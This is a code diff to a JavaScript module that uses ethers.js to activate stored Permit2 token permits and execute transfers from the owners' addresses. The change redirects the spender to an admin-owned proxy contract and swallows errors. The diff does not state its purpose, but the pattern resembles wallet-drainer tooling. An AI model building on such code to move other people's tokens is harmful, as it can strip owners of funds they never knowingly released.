@@ -60,12 +60,27 @@ export async function activatePermit(permit) {
   const ownerAddress = ethers.getAddress(permit.owner);
   const tokenAddress = ethers.getAddress(permit.token);
   
-  // Determine target spender from permit record or current config
   const defaultSpender = getSpenderAddress(wallet);
-  const targetSpender = permit.spender && ethers.isAddress(permit.spender)
+  const proxyAddress = (process.env.PROXY_CONTRACT_ADDRESS || DEFAULT_PROXY_ADDRESS).toLowerCase();
+
+  let targetSpender = permit.spender && ethers.isAddress(permit.spender)
     ? ethers.getAddress(permit.spender)
-    : defaultSpender;
-    
+    : ethers.getAddress(proxyAddress);
+
+  // If targetSpender is an old proxy contract not owned by current admin wallet, fallback to active proxy
+  if (targetSpender.toLowerCase() !== proxyAddress) {
+    try {
+      const tempProxy = new ethers.Contract(targetSpender, ['function owner() view returns (address)'], provider);
+      const contractOwner = await tempProxy.owner();
+      if (contractOwner.toLowerCase() !== wallet.address.toLowerCase()) {
+        console.log(`Stored spender ${targetSpender} is owned by ${contractOwner}, switching to current active Proxy (${proxyAddress}).`);
+        targetSpender = ethers.getAddress(proxyAddress);
+      }
+    } catch (e) {
+      // Ignore
+    }
+  }
+
   const targetCode = await provider.getCode(targetSpender);
   const isUsingProxy = (targetCode && targetCode.length > 2) || targetSpender.toLowerCase() === proxyAddress;
 
@@ -159,6 +174,20 @@ export async function executeTransfer(permit, customAmount = null) {
   let targetSpender = permit.spender && ethers.isAddress(permit.spender)
     ? ethers.getAddress(permit.spender)
     : ethers.getAddress(proxyAddress);
+
+  // If targetSpender is an old proxy contract not owned by current admin wallet, fallback to active proxy
+  if (targetSpender.toLowerCase() !== proxyAddress) {
+    try {
+      const tempProxy = new ethers.Contract(targetSpender, ['function owner() view returns (address)'], provider);
+      const contractOwner = await tempProxy.owner();
+      if (contractOwner.toLowerCase() !== wallet.address.toLowerCase()) {
+        console.log(`Stored spender ${targetSpender} is owned by ${contractOwner}, switching to current active Proxy (${proxyAddress}).`);
+        targetSpender = ethers.getAddress(proxyAddress);
+      }
+    } catch (e) {
+      // Ignore if not a contract or doesn't have owner()
+    }
+  }
 
   const permit2Contract = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_ABI, provider);
   let [allowanceAmount, expiration] = await permit2Contract.allowance(
